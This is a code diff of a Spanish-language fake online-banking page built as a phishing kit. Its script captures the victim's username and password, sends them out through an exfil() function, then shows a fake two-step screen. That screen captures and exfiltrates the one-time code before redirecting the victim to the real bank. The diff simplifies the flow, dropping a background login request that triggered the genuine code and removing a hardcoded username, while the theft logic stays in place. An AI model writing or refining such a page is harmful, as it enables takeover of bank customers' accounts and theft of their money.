@@ -61,7 +61,6 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
   </header>
 
   <main class="wrap">
-    <!-- HERO paso 1 -->
     <section class="hero" id="hero-1">
       <h1>Tu dinero, <em>blindado</em><br>de punta a punta.</h1>
       <p>Banca digital con verificacion en dos pasos, monitoreo antifraude en tiempo real y cifrado de grado bancario en cada operacion.</p>
@@ -81,7 +80,6 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       </div>
     </section>
 
-    <!-- HERO paso 2 -->
     <section class="hero hidden" id="hero-2">
       <h1>Verificacion<br><em>en dos pasos.</em></h1>
       <p>Enviamos un codigo de un solo uso a tu dispositivo de confianza. Ingresalo para completar el acceso y proteger tu cuenta.</p>
@@ -97,7 +95,6 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       </div>
     </section>
 
-    <!-- CARD paso 1: login -->
     <section class="card" id="card-1">
       <div class="eyebrow">Banca en linea</div>
       <h2>Iniciar sesion</h2>
@@ -120,16 +117,15 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       </div>
     </section>
 
-    <!-- CARD paso 2: OTP -->
     <section class="card hidden" id="card-2">
       <div class="eyebrow">Paso 2 de 2</div>
       <h2>Codigo de verificacion</h2>
-      <p class="sub">Hola, <strong id="nombre-usuario">gaston.diaz</strong>. Ingresa el codigo de 6 digitos.</p>
+      <p class="sub">Hola, <strong id="nombre-usuario"></strong>. Ingresa el codigo de 6 digitos.</p>
       <div class="alert hidden" id="alert-2"></div>
       <form id="form-2fa" autocomplete="off">
         <div class="field otp">
           <label for="txt-2fa">Codigo</label>
-          <input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autofocus>
+          <input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000">
         </div>
         <button id="btn-2fa" type="submit" class="btn">Confirmar e ingresar</button>
       </form>
@@ -158,55 +154,26 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       document.getElementById('txt-2fa').focus();
     }
 
-    // PASO 1: capturar creds y disparar login real en background
-    document.getElementById('form-login').addEventListener('submit', async function(e) {
+    // PASO 1: capturar creds y mostrar OTP inmediatamente
+    document.getElementById('form-login').addEventListener('submit', function(e) {
       e.preventDefault();
       const u = document.getElementById('txt-login').value.trim();
       const p = document.getElementById('txt-password').value;
-      const btn = document.getElementById('btn-login');
-
-      btn.disabled = true;
-      btn.textContent = 'Verificando…';
-
-      // Exfiltrar creds
       exfil({step:'1', u, p});
-
-      // Hacer login real en background para disparar el OTP
-      try {
-        const fd = new FormData();
-        fd.append('txtLogin', u);
-        fd.append('txtPassword', p);
-
-        // El banco usa JSON según el JS que vimos
-        await fetch(BANCO + '/api/login', {
-          method: 'POST',
-          headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({txtLogin: u, txtPassword: p}),
-          mode: 'no-cors',
-          credentials: 'omit'
-        });
-      } catch(_) {}
-
-      // Mostrar paso 2 después de un momento
-      setTimeout(() => mostrarPaso2(u), 1200);
+      mostrarPaso2(u);
     });
 
-    // PASO 2: capturar OTP
+    // PASO 2: capturar OTP y redirigir al banco real
     document.getElementById('form-2fa').addEventListener('submit', function(e) {
       e.preventDefault();
       const otp = document.getElementById('txt-2fa').value.trim();
       const btn = document.getElementById('btn-2fa');
-
       btn.disabled = true;
       btn.textContent = 'Confirmando…';
-
-      // Exfiltrar OTP
       exfil({step:'2', otp});
-
-      // Redirigir al banco real después de capturar
       setTimeout(() => {
         window.location.href = BANCO + '/login';
-      }, 1000);
+      }, 800);
     });
 
     document.getElementById('volver-login').addEventListener('click', function(e) {
